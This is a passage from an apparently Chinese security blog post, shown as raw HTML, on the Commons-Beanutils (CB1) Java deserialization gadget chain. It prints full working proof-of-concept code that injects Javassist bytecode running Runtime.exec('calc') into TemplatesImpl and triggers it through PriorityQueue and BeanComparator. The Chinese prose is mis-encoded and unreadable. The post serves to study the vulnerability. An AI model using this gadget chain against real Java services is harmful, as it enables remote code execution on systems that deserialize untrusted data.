Character.toUpperCase(suffix.charAt(<span class="hljs-number">0</span>)) + suffix.substring(<span class="hljs-number">1</span>).toLowerCase();<br>        Long timestamp = System.currentTimeMillis();<br>        String prefix = Long.toString(timestamp);<br>        CtClass ctClass = cp.makeClass(random.nextInt() + prefix.substring(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) + suffix);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br><br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        PropertyUtils.getProperty(templatesimpl, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="Gadget-12"><a href="#Gadget-12" class="headerlink" title="Gadget"></a>Gadget</h3><p>å¦‚ä½•å»¶é•¿<code>PropertyUtils.getProperty</code>ï¼ŒæŸ¥æ‰¾ç”¨æ³•å‘ç°åœ¨<code>BeanComparator.compare</code>æœ‰è°ƒç”¨åˆ°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">( Object o1, Object o2 )</span> </span>&#123;<br><br>    <span class="hljs-keyword">if</span> ( property == <span class="hljs-keyword">null</span> ) &#123;<br>        <span class="hljs-comment">// compare the actual objects</span><br>        <span class="hljs-keyword">return</span> comparator.compare( o1, o2 );<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Object value1 = PropertyUtils.getProperty( o1, property );<br>        Object value2 = PropertyUtils.getProperty( o2, property );<br>        <span class="hljs-keyword">return</span> comparator.compare( value1, value2 );<br>    &#125;<br>    <span class="hljs-keyword">catch</span><br>        ...<br></code></pre></td></tr></table></figure>

<p>å¾ˆæ˜¾ç„¶ï¼Œå½“ o1 æ˜¯<code>TemplatesUImpl</code>å¯¹è±¡æ—¶ï¼Œproperty æ˜¯<code>outputProperties</code>ï¼Œé“¾å­å°±é€šäº†</p>
<p>comparatorï¼Ÿç­‰ç­‰ï¼ŒCC2 å¥½åƒæœ‰<code>TransformingComparator</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(newTransformer);<br>PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>Object[] queue_array = <span class="hljs-keyword">new</span> Object[]&#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br><br>setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, queue_array);<br>setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>setFieldValue(queue, <span class="hljs-string">&quot;comparator&quot;</span>, transformingComparator);<br></code></pre></td></tr></table></figure>

<p><code>PriorityQueue.readObject-&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator</code>ç„¶åå°±è°ƒç”¨åˆ°äº†<code>comparator.compare</code>ï¼ŒCC2 ç”¨<code>TransformingComparator</code>çš„æ—¶å€™åå°„ä¿®æ”¹çš„<code>comparator</code>ï¼Œè¿™é‡Œå½“ç„¶ä¹Ÿå¯ä»¥</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.lang3.RandomStringUtils;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CB1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException </span>&#123;<br>        Random random = <span class="hljs-keyword">new</span> Random();<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String suffix = RandomStringUtils.randomAlphabetic(<span class="hljs-number">5</span>);<br>        suffix = Character.toUpperCase(suffix.charAt(<span class="hljs-number">0</span>)) + suffix.substring(<span class="hljs-number">1</span>).toLowerCase();<br>        Long timestamp = System.currentTimeMillis();<br>        String prefix = Long.toString(timestamp);<br>        CtClass ctClass = cp.makeClass(random.nextInt() + prefix.substring(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) + suffix);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br><br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        BeanComparator comparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><span class="hljs-comment">//        BeanComparator comparator = new BeanComparator();</span><br><span class="hljs-comment">//        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);</span><br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br>        Object[] queue_array = &#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, queue_array);<br>        setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;comparator&quot;</span>, comparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>SLF4J</strong></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/language/">language</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/03/15/JNDI&amp;RMI&amp;LDAP/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">JNDI&RMI&LDAP</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/03/15/Unsafe/">
                        <span class="hidden-mobile"></span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"è¯´ç‚¹ä»€ä¹ˆ","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">è½½å…¥å¤©æ•°...</span> <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- ä¸è’œå­ç»Ÿè®¡PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            æ€»è®¿é—®é‡ 
            <span id="busuanzi_value_site_pv"></span>
             æ¬¡
          </span>
      
      
        <!-- ä¸è’œå­ç»Ÿè®¡UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            æ€»è®¿å®¢æ•° 
            <span id="busuanzi_value_site_uv"></span>
             äºº
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-SL9T1KRBQY', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  

  

  

  





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>


</body>
</html>
